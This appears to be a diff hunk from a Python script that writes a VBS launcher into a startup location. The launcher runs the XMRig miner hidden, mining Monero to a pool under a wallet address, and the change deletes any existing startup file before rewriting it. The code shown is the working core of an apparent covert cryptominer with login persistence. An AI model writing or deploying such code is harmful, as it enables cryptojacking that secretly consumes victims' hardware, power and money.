@@ -43,6 +43,10 @@ if extracted_folders:
     xmrig_path = os.path.join(extracted_dir, "xmrig.exe")
     os.chdir(extracted_dir)
     
+    # Check if the file already exists and remove it if necessary
+    if os.path.exists(STARTUP_PATH):
+        os.remove(STARTUP_PATH)
+
     with open(STARTUP_PATH, "w") as vbs_file:
         vbs_file.write(f'''Set WshShell = CreateObject("WScript.Shell") 
     WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero", 0, False
